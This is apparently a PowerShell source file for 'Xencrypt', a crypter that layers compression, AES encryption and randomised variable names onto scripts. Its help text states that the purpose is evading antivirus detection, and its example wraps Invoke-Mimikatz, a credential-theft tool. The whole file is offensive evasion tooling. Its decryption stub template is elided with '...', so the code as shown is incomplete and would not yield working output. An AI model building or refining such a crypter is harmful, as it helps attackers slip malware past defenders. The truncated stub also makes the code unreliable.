# Xencrypt - PowerShell Crypter
# Copyright (C) 2020 Xentropy ( @SamuelAnttila )
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program. If not, see <https://www.gnu.org/licenses/>.

Set-StrictMode -Version Latest
$ErrorActionPreference = "Stop"
$PSDefaultParameterValues['*:ErrorAction'] = 'Stop'

function Create-Var {
    # Generates a random variable name with a length of 4 to 9 characters for better obfuscation.
    $charset = "abcdefghijkmnopqrstuvwxyz"
    (1..(4 + (Get-Random -Maximum 6)) | ForEach-Object { $charset[(Get-Random -Minimum 0 -Maximum $charset.Length)] }) -join ''
}

function Invoke-Xencrypt {
    <#
    .SYNOPSIS
    Obfuscates and encrypts a PowerShell script to evade antivirus detection.

    .DESCRIPTION
    Invoke-Xencrypt takes a PowerShell script as input and applies compression, encryption, 
    and obfuscation to make it harder for antivirus (AV) solutions to detect and analyze.

    .PARAMETER InFile
    Specifies the path to the input PowerShell script to obfuscate and encrypt.

    .PARAMETER OutFile
    Specifies the path to save the obfuscated and encrypted script.

    .PARAMETER Iterations
    Defines the number of encryption and obfuscation layers to apply. Default is 2.

    .EXAMPLE
    PS> Invoke-Xencrypt -InFile Invoke-Mimikatz.ps1 -OutFile obfuscated.ps1 -Iterations 3

    .LINK
    https://github.com/the-xentropy/xencrypt
    #>

    [CmdletBinding()]
    param (
        [Parameter(Mandatory, Position = 0, ValueFromPipelineByPropertyName)]
        [string]$InFile = $(Throw "-InFile is required"),

        [Parameter(Mandatory, Position = 1, ValueFromPipelineByPropertyName)]
        [string]$OutFile = $(Throw "-OutFile is required"),

        [Parameter(Mandatory = $false, Position = 2, ValueFromPipelineByPropertyName)]
        [int]$Iterations = 2
    )

    process {
        # Display script banner
        Write-Output @"
Xencrypt - PowerShell Crypter
Copyright (C) 2020 Xentropy ( @SamuelAnttila )
Distributed under the GNU General Public License.
"@

        # Validate input file
        Write-Output "[*] Validating input file..."
        if (-not (Test-Path $InFile)) {
            Throw "Error: Input file '$InFile' not found."
        }
        $codeBytes = [System.IO.File]::ReadAllBytes($InFile)

        # Iteratively apply encryption and obfuscation
        for ($i = 1; $i -le $Iterations; $i++) {
            Write-Output "[*] Applying encryption layer $i..."

            # Select random parameters for obfuscation
            $paddingModes = 'PKCS7', 'ISO10126', 'ANSIX923', 'Zeros'
            $cipherModes = 'ECB', 'CBC'
            $keySizes = 128, 192, 256
            $compressionTypes = 'Gzip', 'Deflate'

            $paddingMode = $paddingModes | Get-Random
            $cipherMode = $cipherModes | Get-Random
            $keySize = $keySizes | Get-Random
            $compressionType = $compressionTypes | Get-Random

            # Compress the script
            Write-Output "[*] Compressing script using $compressionType..."
            $outputStream = New-Object System.IO.MemoryStream
            switch ($compressionType) {
                "Gzip"    { $compressionStream = New-Object System.IO.Compression.GzipStream($outputStream, [IO.Compression.CompressionMode]::Compress) }
                "Deflate" { $compressionStream = New-Object System.IO.Compression.DeflateStream($outputStream, [IO.Compression.CompressionMode]::Compress) }
            }
            $compressionStream.Write($codeBytes, 0, $codeBytes.Length)
            $compressionStream.Close()
            $compressedBytes = $outputStream.ToArray()

            # Generate encryption key and IV
            Write-Output "[*] Generating encryption key and IV..."
            $aes = New-Object System.Security.Cryptography.AesManaged
            $aes.Mode = [System.Security.Cryptography.CipherMode]::$cipherMode
            $aes.Padding = [System.Security.Cryptography.PaddingMode]::$paddingMode
            $aes.KeySize = $keySize
            $aes.GenerateKey()
            $aes.GenerateIV()

            # Encrypt the compressed script
            Write-Output "[*] Encrypting compressed script..."
            $encryptor = $aes.CreateEncryptor()
            $encryptedData = $encryptor.TransformFinalBlock($compressedBytes, 0, $compressedBytes.Length)
            $finalData = $aes.IV + $encryptedData
            $encodedScript = [System.Convert]::ToBase64String($finalData)

            # Obfuscate the script
            Write-Output "[*] Obfuscating script layer $i..."
            $stubTemplate = @'
# Obfuscated script layer
${0} = [System.Convert]::FromBase64String("{1}")
${2} = [System.Convert]::FromBase64String("{3}")
...
'@
            $script = $stubTemplate -f (Create-Var), $encodedScript, (Create-Var), [System.Convert]::ToBase64String($aes.Key)
            $codeBytes = [System.Text.Encoding]::UTF8.GetBytes($script)
            $aes.Dispose()
        }

        # Save the final obfuscated script
        Write-Output "[*] Writing final obfuscated script to '$OutFile'..."
        [System.IO.File]::WriteAllText($OutFile, [System.Text.Encoding]::UTF8.GetString($codeBytes))

        Write-Output "[+] Obfuscation and encryption completed successfully!"
    }
}
